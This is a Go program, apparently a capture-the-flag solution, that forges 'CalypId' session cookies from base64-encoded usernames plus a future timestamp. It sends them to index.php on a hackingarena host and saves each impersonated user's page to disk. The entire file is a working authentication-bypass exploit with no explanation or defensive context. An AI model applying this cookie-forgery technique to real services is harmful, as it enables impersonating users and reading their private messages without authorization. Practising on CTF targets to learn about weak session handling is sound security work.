package main

import "encoding/base64"
import "net/http"
import "fmt"
import "io"
import "os"
import "strconv"
import "time"

func main() {

	hostname := "http://koala.hackingarena.no:803"
	usernames := []string{
		"Bamboo",
		"Boomer",
		"Cuddles",
		"Gumnut",
		"Kiwi",
		"Laszlo",
		"Marlow",
		"Taz",
		"Pebble",
	}

	for _, username := range usernames {

		encoded := base64.URLEncoding.EncodeToString([]byte(username))
		seconds := time.Now().Unix()
		seconds += 60 * 60 * 24

		// 14.11.2024 11:44
		cookie := "CalypId=" + encoded + strconv.FormatInt(seconds, 10)

		request, _ := http.NewRequest("GET", hostname + "/index.php", nil)
		request.Header.Set("Cookie", cookie)
		request.Header.Set("Host", hostname)


		client := &http.Client{}
		response, err1 := client.Do(request)

		if err1 == nil {

			if response.StatusCode == http.StatusOK {

				bytes, err2 := io.ReadAll(response.Body)

				if err2 == nil {

					err3 := os.WriteFile("index-" + username + ".php", bytes, 0666)

					if err3 == nil {
						fmt.Println(username + " messages saved")
					}

				} else {
					fmt.Println(username + ":", err2)
				}

			}

		} else {
			fmt.Println(username + ":", err1)
		}

	}

}
